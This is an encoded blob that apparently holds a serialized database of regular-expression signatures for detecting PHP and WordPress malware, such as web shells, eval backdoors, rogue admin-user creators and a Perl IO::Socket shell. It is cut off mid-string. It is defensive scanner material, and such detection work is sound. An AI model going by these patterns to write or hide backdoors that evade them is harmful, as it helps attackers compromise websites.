zKikqKGlmW1woXHNdK2lzc2V=XChcJF8oUE9TfEdFfFJFUVVFUylUXFtbXlwpXStbXClcc1=rKT8oZWNob1xzKik_KChcJFthLXpfMC=5XSspXHMqPVxzKlxAP2Jhc2U2NF9kZWNvZGVcKFteO1=rO1xzKlxAPyhldmFsXCguKlw5fFw5XHMqXChccypcJF8oUE9TfEdFfFJFUVVFUylUKXxcQD9ldmFsXChbXjtdKmJhc2U2NF9kZWNvZGVcKClbXlwpXSpcKSs7XHMqKHJldHVyblteO1=qOykqL2kiO31zOjUxOiJzZXNzaW9uX3N=YXJ=IGVycm9yX3JlcG9ydGluZyBzZXRfdGltZV9saW1pdCBmb29=ZXIiO2E6Mjp7aTowO3M6NToiRDRKTWgiO2k6MTtzOjEyMDoiL1w8XD9waHBbXHJcbiBcdF=rc2Vzc2lvbl9zdGFydFwoXCk7W1xyXG4gXHRdK2Vycm9yX3JlcG9ydGluZ1woMFwpO1tcclxuIFx=XStzZXRfdGltZV9saW1pdFwoLis_PFw_IGVjaG8gXCRmb29=ZXI7XD8-L2lzIjt9czoxODoiZnVuY3Rpb24gQlNTViBldmFsIjthOjI6e2k6MDtzOjU6IkQ=TkNDIjtpOjE7czo2OToiLyhcL1wqLio_XCpcL1tcclxuIFx=XSopKmZ1bmN=aW9uIEJTU1ZcKC4rZXZhbFwoQlNTVlwoLis_W1wpXStbO1=qL2lzIjt9czoyMzoiRmlsZXNNYW4gcHJlZ19yZXBsYWNlIC4iO2E6Mjp7aTowO3M6NToiRUNGSHMiO2k6MTtzOjI=NjoiLzxcP1twaFxzXSooXC9cKi4rP1wqXC9ccyopKihcJFthLXpcXzAtOV=rXHMqPVteO1=rO1xzKikqXCRbYS16XF8wLTldK1xzKj1bXHMiJ1=qRlsiJ1wuXHNdKmlbIidcLlxzXSpsWyInXC5cc1=qZVsiJ1wuXHNdKnNbIidcLlxzXSpNWyInXC5cc1=qYVsiJ1wuXHNdKm5bIidcc1=qOyhccypcJFthLXpcXzAtOV=rXHMqPVteO1=rOykqXHMqKFwkW2EtelxfMC=5XSt8cHJlZ19yZXBsYWNlKVwoW15cKV=qW1wpO1xzXSsoJHxcPz4pL2lzIjt9czoyNToiZnVuY3Rpb24gQXJyYXkgcHJpbnQgZXhpdCI7YToyOntpOjA7czo1OiJIMjdBcyI7aToxO3M6NTgzOiIvPFw_W3BoXHNdKyhcJFtfXC1cPlwuYS16MC=5XHtcWyciXF1cfV=rXHMqPVteO1=rO1xzKikqKChmdW5jdGlvblxzK1thLXpfMC=5XStcKC4qP1wpXHMqXHsoXCRbXj1dKz1ccypbJyJdezJ9KT98Zm9yW1xzKF=rW15ce1=rXHtbXlx9XStcfS4qP3wocmV=dXJufGdsb2JhbClccysoXCRce1teXH1dK1x9Kyk_W147XSo7fFwkXHsuKz9cfVxzKlwoLio_XCkrO3xcJFx7Lis_XH1ccyo9XHMqYXJyYXlcKCgoW2Etel8wLTldK1woLio_XCkrLFxzKikrW2Etel8wLTldK1woLio_KT9cKSs7fGlmXHMqXCguKj9cKStccypce3xlbHNlW1xzXHtdKnxcJFtfXC1cPlwuYS16MC=5XHtcWyciXF1cfV=rW1xzXC5dKj=oXHMqY2hyXCguKj9cKSt8KC4rP1xeKXs1LH18W147XStcXlxzKlxkKylbXjtdKjt8ZXhpdFwoLio_XCkrO3woXCQoXHtbYS16XzAtOV=rXCguKz9cKVx9KFxzKlxbW15cXV=qXF=rKSp8Y29udGVudHx1cmwpW1xzXCtcLjtcfTw-XC5dKikrPVxzKihbXEBcJFx7XSpbYS16XzAtOVx9XSsoXCguKz9cKXxcWy4rP1xdKSlcfSo7fGZvcmVhY2guKz9ccythc1xzK1teXCldK1teXHtdK1x7KVs7XHNcfV=qKXs1MCx9KCR8XD8-KS9pIjt9czozMzoibWQ1dGFnZ2VkIGV2YWwgdmFyaWFibGUgZnVuY3Rpb25zIjthOjI6e2k6MDtzOjU6IkY5NksxIjtpOjE7czo3MjoiLygoXCRbYS16XF8wLTldKylccyo9XHMqW147XSs7XHMqKStcQD9ldmFsXChbXjtdKlwyXHMqXChbXlwpXSpbXClcc1=rOy9pIjt9czoyOToiaWYgaXNzZXQgUkVRVUVTVCBldmFsIFJFUVVFU1QiO2E6Mjp7aTowO3M6NToiRjdVRFAiO2k6MTtzOjIyOToiL2lmW1xzXChdK2lzc2V=W1xzXChdK1wkXyhSRVFVRVN8R=V8UE9TKVQoXChbXlwpXSpcKSt8XFtbXlxdXSpcXSt8XHtbXlx9XSpcfSspKlteXHtdK1tce1xzXStldmFsW1xzXChdKyhbYS16XzAtOV=rXChccyopKlwkXyhSRVFVRVN8R=V8UE9TKVQoXChbXlwpXSpcKSt8XFtbXlxdXSpcXSt8XHtbXlx9XSpcfSspKltcc1wpO1=rKChkaWV8ZXhpdHxlY2hvfHByaW5=KVteO1=qO1xzKikqXH1bO1xzXSsvaSI7fXM6MTQ6IkdMT=JBTFMgMCBldmFsIjthOjI6e2k6MDtzOjU6IkQ1OU1LIjtpOjE7czo3NjoiLyhcJChHTE9CQUxTXFtbJyJdKSpbMG9PXStbJyJcXVw9XC4gXHRdK1teO1=rO1tcclxuIFx=XSopK2V2YWxcKC4rW1wpXStbO1=qLyI7fXM6MzI6ImVycm9yX3JlcG9ydGluZyBwYXNzd29yZCBleGl=IG1lIjthOjI6e2k6MDtzOjU6IkQ1QkJrIjtpOjE7czoxNzI6Ii88XD8ocGhwKT9bXHJcbiBcdF=qZXJyb3JfcmVwb3J=aW5nXCgwXCk7W1xyXG4gXHRdKlwvXC9JZiB=aGVyZSBpcyBhbiBlcnJvciwgd2UnbGwgc2hvdyBpdCwga1w_W1xyXG4gXHRdKlwkcGFzc3dvcmRbPSBcdF=rLisgOi1cKVtcclxuIFx=XSpleGl=XChcKTtbXHJcbiBcdF=qXD8-XC5cJG1lXC4vaXMiO31zOjI4OiJwaHAgU3RhcnRpbmcgY2FsbHMgYzk5c2hleGl=IjthOjI6e2k6MDtzOjU6IkQ1REg3IjtpOjE7czoxMDY6Ii88XD8ocGhwKSpbXHJcbiBcdF=rXC9cL1N=YXJ=aW5nIGNhbGxzLitjaGRpclwoXCRsYXN=ZGlyXClbO1xyXG4gXHRdK1thLXowLTldK2V4aXRcKFwpWztcclxuIFx=XSooXD8-KSovaXMiO31zOjM1OiJpZiBpc3NldCBSRVFVRVNUIGZvcmVhY2ggYXJyYXkgZXZhbCI7YToyOntpOjA7czo1OiJHM=4wMSI7aToxO3M6MTU5OiIvaWZbXHNcKF=rKFthLXpfMC=5XStccypcKFxzKikqXCRfKFJFUVVFU3xHRXxQT1MpVFxbW15ce1=rXHtccyooXCRbYS16XzAtOV=rXHMqPVteO1=rO1xzKnwuKj9mb3JlYWNoXChhcnJheS4qPykqW1xzXEBdKihzeXN=ZW18ZXZhbClcKC4rXHMqKGV4aXRbXjtdKjtccyopKlx9L2kiO31zOjIwOiJwaHAgcGFzc3dvcmQgaGdfZXhpdCI7YToyOntpOjA7czo1OiJEOEo3ZSI7aToxO3M6NDg6Ii88XD8ocGhwKT8oXHMpK1wkcGFzc3dvcmQoLis_KWhnX2V4aXRcKFwpOyguKykvcyI7fXM6NzI6ImlmIGVtcHR5IFNFUlZFUiBIVFRQX1VTRVJfQUdFTlQgc2V=X3RpbWVfbGltaXQgbW92ZV91cGxvYWRlZF9maWxlIHJldHVybiI7YToyOntpOjA7czo1OiJHOEdCVCI7aToxO3M6MzAzOiIvKDxodG1sLio_PGJvZHk-XHMqKT88XD9bcGhdKlxzKigocHJpbnR8ZWNobylbXjtdKjtccyp8XC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqaWZbXHNcKFwhXSsoXEA_aXNfdXBsb2FkZWRfZmlsZXxlbXB=eVwoXCRfU=VSVkVSXFtbIiddSFRUUF9VU=VSX=FHRU5UWyInXVxdW1wpXHNdKyguKz8pc2V=X3RpbWVfbGltaXQpLis_bW92ZV91cGxvYWRlZF9maWxlLisocmV=dXJuIFwkW2Etel8wLTldK3x=b3VjaFxzKihcL1wqLio_XCpcL1xzKikqXChbXjtdKyk7W1xzXH1dKygkfFw_Pihccyo8XC8oYm9keXxodG1sKT4pKikvaXMiO31zOjM1OiJlcnJvcl9yZXBvcnRpbmcgaW5pX3NldCB1bmxpbmsgRklMRSI7YToyOntpOjA7czo1OiJIMkY5aiI7aToxO3M6MzAwOiIvXEA_ZXJyb3JfcmVwb3J=aW5nXCgwXCk7XHMqKGluaV9zZXRcKC4rXEA_dW5saW5rXChfX=ZJTEVfX1wpO3woaWZbXHNcKFwhXSsoaXNzZXRcKHxmaWxlX2V4aXN=c1woKT9ccypcJF8oU=VSVkVSfFJFUVVFU1R8R=VUfFBPU1R8RklMRVMpXFtbXlxdXStcXStbXlwpXSpcKVtcKVxzXHtdKihlY2hvW147XSs7XHMqKSopK1xAP2NvcHlcKChbXHNcLF=qXCRfRklMRVMoXFtbXlxdXStcXSspKykrW1wpXHNdKztbXHNcfV=rXD8-XHMqKDwoZm9ybXxpbnB1dClbXj5dKz5ccyopKzxcL2Zvcm=-XHMqKDxcP1twaFxzXStcfSspPykvaXMiO31zOjMxOiJwaHAgaWYgbWQ1IFJFUVVFU1QgZXZhbCBSRVFVRVNUIjthOjI6e2k6MDtzOjU6IkVCUk51IjtpOjE7czoxNTY6Ii88XD9bcGhcc1=rKFwkW2EtelxfMC=5XStccyo9XHMqLis_O1xzKikqaWZcKFwobWQ1XChcJF9SRVFVRVNUXFsuKz9ldmFsXChcJFthLXpcXzAtOV=rXChcJF9SRVFVRVNUXFsuKj87XH1cfVw_Pig8Zm9ybVtePl=qKD5ccyo8aW5wdXRbXj5dKikrPlxzKjxcL2Zvcm=-KT8vcyI7fXM6MzM6Ii9hdXRoX3Bhc3MgbG92ZSBzZXRfZXJyb3JfaGFuZGxlciI7YToyOntpOjA7czo1OiJEQU=5ciI7aToxO3M6OTM6Ii9cPFw_KD89LipcJGF1dGhfcGFzcykoPz=uKmxvdmVMb2dpbikoPz=uKmxvdmVzZXRjb29raWUpKD89LipzZXRfZXJyb3JfaGFuZGxlclwoKS4rKFw_XD4pKi9pcyI7fXM6NDk6ImZ1bmN=aW9uIGd6aW5mbGF=ZSBiYXNlNjRfZGVjb2RlIGZvciBjaHIgb3JkIGV2YWwiO2E6Mjp7aTowO3M6NToiRjhWR3giO2k6MTtzOjIyMToiLyhmdW5jdGlvblxzKyhbYS16XzAtOV=rKVxzKlwoXHMqKFwkW2Etel8wLTldKylbXClcc1x7XStcM1s9XHNdK2d6aW5mbGF=ZVwoYmFzZTY=X2RlY29kZVwoLitbXCk7XHNdKyk_Zm9yW1xzXChdKy4rP1x7XHMqKFwkW2Etel8wLTldKylbXC5cc1=qPVtcQFxzXSpjaHJcKFteO1=rWztcc1x9XSsocmV=dXJuW147XSpbO1x9XHNdKyk_ZXZhbFwoKFwyXCh8XDQpW15cKV=qW1wpXHNdKzsqL2kiO31zOjE4OiIvZnVuY3Rpb24geCBldmFsIHgiO2E6Mjp7aTowO3M6NToiRzcxQzQiO2k6MTtzOjE1MToiLyhpZlxzKlwoW15ce1=rXHtccyopP2Z1bmN=aW9uXHMrKFthLXpfMC=5XSspXHMqXChbXlx7XStce1xzKihcJFthLXpfMC=5XStccyo9W147XSs7XHMqKSpcQD8oYXNzZXJ=fGV2YWwpXCguKz9cMlwoXCRfKFJFUVVFU3xHRXxQT1MpVFxbLis_XCk7W1xzXH1dKi9pcyI7fXM6MTE6ImluY2x1ZGUgR=VUIjthOjI6e2k6MDtzOjU6IkgyQUs3IjtpOjE7czoyOTM6Ii8oKFwkWzAtOV9hLXpdKylccyo9XHMqKFsiJ1=pKFthLXpcL19cLTAtOVwuXSpcXHhbYS1mMC=5XXsyfSkrW15cM1=qP1wzOyk_W1xAXHNdKihpbmNsdWRlfHJlcXVpcmUpKF9vbmNlKT9bXHNcKF=qKFwvXCpbXlwqXSooXCpbXlwqXC9dKikrXC9ccyopKltcKFxzXSooKFsiJ1=pKFthLXpcL19cLTAtOVwuXSpcXHhbYS1mMC=5XXsyfSkrW15cMTBdKj9cMTB8XDJ8XCRfKD8hUkVRVUVTVFxbJ3RhcmdldCdcXTspKFBPU3xSRVFVRVN8R=UpVFxzKihcW1teXF1dK1xdXHMqfFx7W15cfV=rXH1ccyopKylbXHNcKV=qOy9pIjt9czoyMjoiZXZhbCBhcnJheV9wb3AgUkVRVUVTVCI7YToyOntpOjA7czo1OiJEQk=5NSI7aToxO3M6NjM6Ii9ldmFsXChbXHRhLXpfMC=5IFwoXSphcnJheV9wb3BcKFwkXyhHRXxQT1N8UkVRVUVTKVRbXCldK1s7XSovaSI7fXM6NDI6ImlmIGlzc2V=IFJFUVVFU1QgZXZhbCBvciBmaWxlX3B1dF9jb25=ZW5=cyI7YToyOntpOjA7czo1OiJIMUdDZyI7aToxO3M6MzcxOiIvPFw_W3BoXHNdKyhmdW5jdGlvbiAoW2Etel8wLTldKylcKFteXHtdK1tce1xzXSsuK3JldHVyblteO1=qO1t9XHNdKyk_aWZbXHNcKF=raXNzZXRbXHNcKF=rXCRfKFJFUVVFU3xHRXxQT1MpVChccypcW1teXF1dK1xdKStbXClcc1x7XSsoXCRbYS16X1wtMC=5XStccyo9XHMqLis_O1xzKikqKCgoaGVhZGVyfHVubGluaylcKFteO1=rWztcc1=rKXsyLH1bXH1cc1=qZWxzZVtce1xzXSsoXCRbYS16X1wtMC=5XStccyo9XHMqLis_O1xzKikqKChcJFthLXpfXC=wLTldK1xzKj1ccyopP1xAPyhldmFsfFwyKVwoLis_XCk7XHMqKXsyLH18ZmlsZV9wdXRfY29udGVudHNcKFteLF=rLFxzKmJhc2U2NF9kZWNvZGVcKC4rP1wpOylbXH1cc1=qKFw_PnwkKS9pcyI7fXM6MjM6ImlmIGZvciB1bnNldCB3cF93cCBmb3JtIjthOjI6e2k6MDtzOjU6IkU4R=JQIjtpOjE7czoxMjQ6Ii8oXCR3cFtfXSt3cFsgXHRdKj1bXjtdKztbXHJcbiBcdF=qKSooaWZ8Zm9yfHVuc2V=KVsgXHRdKlwoXCR3cFtfXSt3cFteO1=rOy4rP1w_Pjxmb3JtLis_bmFtZT1bJyJdd3BbX1=rd3BbJyJdLis_PFwvZm9ybT4vaXMiO31zOjI4OiJhc3NlcnQgSGV4IDY=ZW5jb2RlZFRleHQgSGV4IjthOjI6e2k6MDtzOjU6IkY1MkRFIjtpOjE7czoyOTQ6Ii8oYXNzZXJ=X29wdGlvbnNcKC4rP1wpO1xzKnxmdW5jdGlvbiBbYS16XzAtOV=rXChbXlwpXSpbXClcc1x7XSsuKz9yZXR1cm5bXjtdKls7XH1cc1=rfFwkKGNvbG9yfGF1dGh8cGFzc3xkZWZhdWx=fF9fKVtfXC1cPlwuYS16MC=5XSpccyo9Lis_O1xzKikqKCgoXCRbYS16XzAtOV=rKVxzKj=uKj9cJFwyfChcJFthLXpfMC=5XSspXHMqPS4qP1w1KS4qXHMqKSphc3NlcnRcKFxzKigiKFxceFswLTlBLUZdWzAtOUEtRl=pKydbXC9hLXpcXzAtOVw9XSsnKFxceFswLTlBLUZdWzAtOUEtRl=pKyJ8XDYpW1wpXHNdKzsvaSI7fXM6MjQ6IndlYiBzaGVsbCBmb3BlbiBwYXNzdGhydSI7YToyOntpOjA7czo1OiJFMjY=cSI7aToxO3M6Njk6Ii9eLis_ZXJyb3JfcmVwb3J=aW5nXCguKz93ZWJbIFx=XSpzaGVsbC4rP2ZvcGVuXCguKz9wYXNzdGhydVwoLis_JC9pcyI7fXM6NTc6InBocCBpZiBpc19kaXIgZmlsZV9nZXRfY29udGVudHMgaWYgZmlsZV9wdXRfY29udGVudHMgZWNobyI7YToyOntpOjA7czo1OiJHN=QwVyI7aToxO3M6MzQ1OiIvPFw_W3BoXHNdKyhcL1wvW15cbl=qW1xyXG5dK3xcJFthLXpfMC=5XStccyo9W147XSo7XHMqfGVycm9yX3JlcG9ydGluZ1woW147XSs7XHMqKSsuKz8oaW5jbHVkZVteO1=qd3AtY2xhc3MtaGVhZGVycy5waHAuKz98aWZbXChcc1=raXNfZGlyW15ce1=rXHsoXHMqXCRbYS16XzAtOV=rXHMqPWZpbGVffFteXH1dK1x9XHMqKWdldF8oYWxsX2RpcnNcKC4rP3xjb25=ZW5=c1woW147XSo7XHMqXCRbYS16XzAtOV=rXHMqPVteO1=qO1xzKihpZltcKFxzXSspPykpZmlsZV9wdXRfY29udGVudHNcKC4rPygodG91Y2hcKC4rfGVjaG9bXjtdKjtccyp8XH=oXHMqZWxzZVtcc1x7XSspPylccyopKygkfFw_PikvaXMiO31zOjUzOiJ2YXIgZnVuY3Rpb25zIHJldHVybiBuZXcgUmVjdXJzaXZlQXJyYXlJdGVyYXRvciBhcnJheSI7YToyOntpOjA7czo1OiJFMjY2YyI7aToxO3M6MTkxOiIvKFwkW2EtelxfMC=5XStbXHQgPV=rIlthLXpcX1wtXFwwLTldKiI7W1xyXG4gXHRdKikrKChcJFthLXpcXzAtOV=rW1x=ID1dKyk_XCRbYS16XF8wLTldK1woKy4rP1tcKV=rO1tcclxuIFx=XSopKy4rcmV=dXJuWyBcdF=rbmV3WyBcdF=rUmVjdXJzaXZlQXJyYXlJdGVyYXRvcltcKCBcdF=rYXJyYXkuKz9bXCkgXHRdKztbXH1dKy9pcyI7fXM6NzY6ImRpc3BsYXlfZXJyb3JzIGZpbGVfZ2V=X2NvbnRlbnRzIF9SRVFVRVNUIGZpbGVuYW1lIHVwZGF=ZV9jb2RlIGZ3cml=ZSB1bmxpbmsiO2E6Mjp7aTowO3M6NToiRzhNSjQiO2k6MTtzOjE1MzoiL14uKz8oZXJyb3JfcmVwb3J=aW5nXCgwXCl8ZGlzcGxheV9lcnJvcnMpLis_KGZpbGVfZ2V=X2NvbnRlbnRzXChbXjtdKnx1cmxkZWNvZGVcKClcJF8oUE98UkVRVUUpU1RcW1siJ11mW2lsZV=qbmFtZVtzXT9bIiddXF=uKz9md3JpdGVcKC4rP3VubGlua1woLiskL2lzIjt9czo1MToiZGlzcGxheV9lcnJvcnMgY3JlYXRlX3dwX3VzZXIgUkVRVUVTVCBmd3JpdGUgdW5saW5rIjthOjI6e2k6MDtzOjU6IkUyRjliIjtpOjE7czo3OToiL14uKz9kaXNwbGF5X2Vycm9ycy4rP2NyZWF=ZV93cF91c2VyXChcJF9SRVFVRVNUXFsuKz9md3JpdGVcKC4rP3VubGlua1woLis_JC9pcyI7fXM6MTc6InBocCBjbGFzcyB2aWFXb3JtIjthOjI6e2k6MDtzOjU6IkY3NEVlIjtpOjE7czoyNTI6Ii88XD9bcGhcc1=rKFwvXCouKj9cKlwvXHMqKSooY2xhc3MgdmlhV29ybVxzKlx7Lis_ZndyaXRlXCguKz9maWxlX2dldF9jb25=ZW5=c1woLis_dW5saW5rXCguKz9iYXNlNjRfZW5jb2RlXCguKz8pP2ZpbGVfcHV=X2NvbnRlbnRzXChbXixdKyxccypiYXNlNjRfZGVjb2RlXCgoXEA_ZmlsZV9nZXRfY29udGVudHNcKC4rfFteXCldK1tcKTtcc1=rZWNob1tcc1woXStmaWxlX2dldF9jb25=ZW5=c1woW15cKV=rW1wpO1xzXSsoJHxcPz4pKS9pcyI7fXM6NDI6ImlmIGlzc2V=IFJFUVVFU1QgRklMRSBzdHJpcHNsYXNoZXMgUkVRVUVTVCI7YToyOntpOjA7czo1OiJHNjhDMyI7aToxO3M6MjgyOiIvaWZbXHNcKF=raXNzZXRbXHNcKF=rXCRfKEdFfFBPU3xSRVFVRVMpVChccypcW1teXF1dKlxdK3xccypce1teXH1dKlx9KykrW1xzXClce1=rKChcJFthLXpfMC=5XSspXHMqPVxzKlwkXyhHRXxQT1N8UkVRVUVTKVQoXHMqXFtbXlxdXSpcXSt8XHMqXHtbXlx9XSpcfSspK1teO1=qWztcc1=qKSooYXNzZXJ=fGV2YWx8XCRbYS16XzAtOV=rKVxzKlwoK3N=cmlwc2xhc2hlc1woXCRfKEdFfFBPU3xSRVFVRVMpVChccypcW1teXF1dKlxdK3xccypce1teXH1dKlx9KykrW1xzXCldKztbXH1cc1=qL2kiO31zOjgxOiJlcnJvcl9yZXBvcnRpbmcgZXZhbCBjdXJsX2luaXQgZmlsZV9nZXRfY29udGVudHMgZmlsZV9wdXRfY29udGVudHMgaW5jbHVkZSB1bmxpbmsiO2E6Mjp7aTowO3M6NToiRTVFRFoiO2k6MTtzOjIwMToiL1wkW2EtelxfMC=5XStbPVxzXStfX=ZJTEVfXztccypcJFthLXpcXzAtOV=rW1xzPV1bXjtdezIwMDB9Lio_ZXJyb3JfcmVwb3J=aW5nXCguKz9ldmFsXCguKz8oY3VybF9pbml=fGZpbGVfZ2V=X2NvbnRlbnRzKS4rP2ZpbGVfcHV=X2NvbnRlbnRzXCguKz9pbmNsdWRlLio_dW5saW5rXCguKj9cKTtccypcfVxzKmVsc2Vccypce1teXH1dK1tcfV=rL2lzIjt9czo1NjoiaWYgaXNzZXQgUE9TVCBmaWxlX2dldF9jb25=ZW5=cyBmb3BlbiBmd3JpdGUgZmNsb3NlIGV4aXQiO2E6Mjp7aTowO3M6NToiRTVJTm8iO2k6MTtzOjI5MjoiLyhcJGF1dGhfcGFzc1s9XHNdKy4rPyk_KGlmW1xzXSpcKFtcc1=qaXNzZXRbXHNdKlwoW1xzXSpcJF8oUkVRVUVTfEdFfFBPUylUXFsuKz9maWxlX2dldF9jb25=ZW5=c1woX19GSUxFX18uKz9mb3BlblwoLis_ZndyaXRlXCguKj9mY2xvc2VcKC4qP2V4aXQ7W1xzXH1dKikrKGlmW1xzXSpcKFtcc1=qaXNzZXRbXHNdKlwoW1xzXSpcJF8oUkVRVUVTfEdFfFBPUylUXFtbXlx7XStbXHNce1=raWZbXHNdKlwoW1xzXSpmaWxlX2V4aXN=c1tcc1=qXChbXlx7XStbXHNce1=rW15cfV=rW1x9XVteXH1dKltcfV=pPy9pcyI7fXM6NjA6InBhdGggaWYgZmlsZV9leGlzdHMgaXNfd3JpdGFibGUgaWYgZnVuY3Rpb25fZXhpc3RzIFdyaXRlRGF=YSI7YToyOntpOjA7czo1OiJFNUZDdiI7aToxO3M6MTM5OiIvXCRwYXRoWz1cc1=rLitbXHNdKmlmW1xzXSpcKFwhZmlsZV9leGlzdHNcKC4rP2lzX3dyaXRhYmxlXChbXlwpXSpbXClcc1x7XStpZltcc1=qXChmdW5jdGlvbl9leGlzdHNcKC4rP1dyaXRlRGF=YS4rP1dyaXRlRGF=YVwoXCk7W1xzXH1dKy9pIjt9czo1MjoiYXV=aF9wYXNzIGNvcHkgRklMRVMgZXhlYyBwYXNzdGhydSBzeXN=ZW=gc2hlbGxfZXhlYyI7YToyOntpOjA7czo1OiJGNERIMSI7aToxO3M6MTIxOiIvPFw_KD89LipcJChtZDV8YXV=aClfcGFzc1xzKj=pKD89Lipjb3B5XChcJF8oUE9TVHxGSUxFUylcWykoPz=uKmV4ZWNcKCkoPz=uKnBhc3N=aHJ1KSg_PS4qc3lzdGVtKSg_PS4qc2hlbGxfZXhlY1woKS4rL2lzIjt9czo4ODoicGhwIHNldF9=aW1lX2xpbWl=IGZpbGVfZ2V=X2NvbnRlbnRzIFJFUVVFU1QgZmlsZV9nZXRfY29udGVudHMgRklMRVMgZm9wZW4gUkVRVUVTVGZ3cml=ZSI7YToyOntpOjA7czo1OiJFNUlOQSI7aToxO3M6MTU=OiIvPFw_KHBocCk_Lis_c2V=X3RpbWVfbGltaXRcKC4rP2ZpbGVfZ2V=X2NvbnRlbnRzXChcJF8oUkVRVUVTfEdFfFBPUylULis_ZmlsZV9nZXRfY29udGVudHNcKFwkX=ZJTEVTXFsuKz9mb3BlblwoXCRfKFJFUVVFU3xHRXxQT1MpVC4rP2Z3cml=ZVwoLis_KFw_XD4pL2lzIjt9czoxNDA6ImVycm9yX3JlcG9ydGluZyBmdW5jdGlvbiBlcnJvcl8=MDQgdHRwX3JlcXVlc3RfY3VzdG9tIGdldElwIGdldFVzZXJhZ2VudCBjb252ZXJ=SXBUb1N=cmluZyBodHRwX2J1aWxkX3F1ZXJ5IGZpbGVfZ2V=X2NvbnRlbnRzIGZ3cml=ZSBsb25nMmlwIjthOjI6e2k6MDtzOjU6IkY3VjloIjtpOjE7czoyMTI6Ii88XD8uKz9lcnJvcl9yZXBvcnRpbmdcKCg_PS4rP2dldFtfXSpJcFwoKSg_PS4rP2Z1bmN=aW9uIGVycm9yXzQwNFwoKSgoPz=uKz9zdHJlYW1fY29udGV4dF9jcmVhdGVcKCl8KD89Lis_cmVxdWVzdF9jdXN=b21cKCkpKD89Lis_aHR=cF9idWlsZF9xdWVyeVwoKSg_PS4rP2ZpbGVfZ2V=X2NvbnRlbnRzXCgpKD89Lis_aGVhZGVyXCgpKD89Lis_bG9uZzJpcFwoKS4rL2lzIjt9czo=NToiaWYgZnVuY3Rpb25fZXhpc3RzIGZ1bmN=aW9uIHZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6IkczOUtGIjtpOjE7czozMTI6Ii8oXC9cKlteXCpdKihcKlteXCpcL1=qKStcL1xzKikqKFwkW2Etel8wLTldKyhccypcW1teXF1dK1xdKykqW1wuXHNdKj1bXjtdKztccyopKmlmW1woXHNcIV=rZnVuY3Rpb25fZXhpc3RzW1woXHNdKyhbJyJdKSguKz8pXDVbXClcc1=rXHtccypmdW5jdGlvblxzKlw2XHMqXCguKz9yZXR1cm4uKj87W1xzXH1dKygoXCRbYS16XzAtOV=rKVxzKj1ccyooY3JlYXRlX2Z1bmN=aW9uXHMqXChbXixdKyxccyopP1w2XChbXjtdK1s7XH1cc1=rKSsoXHMqKFwkW2Etel8wLTldK1xzKj1ccyopP1wkW2Etel8wLTldK1woW147XStbIidcKTtcfVxzXSspKy9pcyI7fXM6NDY6InBlcmwgdXNlIElPOjpTb2NrZXQgc2Nhbl9kaXIgdW5hbWUgc3lzdGVtIGV4ZWMiO2E6Mjp7aTowO3M6NToiRThTN2UiO2k6MTtzOjc=OiIvXCNcIVwvdXNyXC9iaW5cL3BlcmwuKz9zY2FuX2RpclwoLis_dW5hbWVcKC4rP3N5c3RlbVwoLis_ZmlsZW1hbmFnZXIuKy9pcyI7fXM6NjE6ImZ1bmN=aW9uIFhfaXAgWF9tYWNyb3MgZXJyb3JfNDA=IGh=dHBfcmVxdWVzdCBmd3JpdGUgRlVOQ1RJT=4iO2E6Mjp7aTowO3M6NToiRTlIOTUiO2k6MTtzOjExNjoiL1w8XD8uKz9faXBcKCguKz9mdW5jdGlvbiBbYS16MC=5XStfbWFjcm9zXCgpezR9Lis_ZnVuY3Rpb24gZXJyb3JfNDA=XCguKz9odHRwX3JlcXVlc3QuKz9md3JpdGVcKC4rP19fRlVOQ1RJT=5fXy4rL3MiO31zOjMxOiJpZiBpc3NldCBldmFsIFZhcmlhYmxlIGZ1bmN=aW9uIjthOjI6e2k6MDtzOjU6Ikc=Q=VEIjtpOjE7czoyNTc6Ii8oXEA_dG91Y2hcKC4qXCkrO1xzKikqKFwkW2Etel8wLTlce1wkXH1dKyhccypcW1teXF1dK1xdKSpccyo9W147XSs7XHMqKSppZltcc1woXCFdK2lzc2V=W1xzXChdK1wkW2Etel8wLTlce1wkXH1dKyhccypcW1teXF1dK1xdKSpbXClcc1x7XSsuKj9ccyooXCRbYS16XzAtOVx7XCRcfV=rKFxzKlxbW15cXV=rXF=pKlxzKj1ccyopP1xAP2V2YWxcKC4qP1wkW2Etel8wLTlce1wkXH1dKyhccypcW1teXF1dK1xdKSpccypcKC4qP1wpKztbO1x9XHNdKi9pIjt9czo1NzoiZXJyb3JfcmVwb3J=aW5nIGV4ZWMgc3lzdGVtIHBhc3N=aHJ1IGZvcGVuIFJFUVVFU1QgZndyaXRlIjthOjI6e2k6MDtzOjU6IkY=NzU1IjtpOjE7czoyMzY6Ii88XD8uKz8oc2V=X3RpbWVfbGltaXRcKDB8ZXJyb3JfcmVwb3J=aW5nXCgwfGV4cGxvZGVcKFsnIl13cC1jb25=ZW5=KSg_PS4rP3VubGlua1xzKlwoKSg_PS4rP3Bhc3N=aHJ1XHMqXCgpKD89Lis_c3lzdGVtXHMqXCgpKD89Lis_ZXhlY1xzKlwoKSgoPz=uKz9jdXJsX2luaXRccypcKCkoPz=uKz9maWxlX2dldF9jb25=ZW5=c1xzKlwoKXwoPz=uKz9yZWFkZGlyXHMqXCgpKSg_PS4rP2Z3cml=ZVxzKlwoKS4rL2lzIjt9czo4NzoiaW5pX3NldCBvYl9zdGFydCByZWdpc3Rlcl9zaHV=ZG93bl9mdW5jdGlvbiBpZiBIVFRQX1VTRVJfQUdFTlQgZmlsZV9nZXRfY29udGVudHMgcmV=dXJuIjthOjI6e2k6MDtzOjU6IkY1SzdqIjtpOjE7czoyNzY6Ii9cQD9pbmlfc2V=XCguK1xzKyhcQD9vYl9zdGFydFwoWyInXSguKz8pWyciXVwpO1xzK1xAP3JlZ2lzdGVyX3NodXRkb3duX2Z1bmN=aW9uXCguK1xzKyhmdW5jdGlvbiBcMlwoXCRbYS16XF8wLTldK1tcKVxzXHtdK2lmLis_SFRUUF9VU=VSX=FHRU5ULitbXClcc1x7XSsuKz9maWxlX2dldF9jb25=ZW5=cy4rXHMqcmV=dXJuW147XSo7W1xzXH1dKyk_fChcJFthLXpcXzAtOV=rKVxzKj1ccypiYXNlNjRfZGVjb2RlXCguK1xzKmVjaG8uKz9maWxlX2dldF9jb25=ZW5=c1woXDQuKykvaSI7fXM6Mzg6ImlmIENPT=tJRSBnemluZmxhdGUgYmFzZTY=X2RlY29kZSBldmFsIjthOjI6e2k6MDtzOjU6IkY=TEQ4IjtpOjE7czoyNDc6Ii9pZlxzKlwoLis_XChcJF9DT=9LSUUuKz9bXHtcc1=qKFwkW2E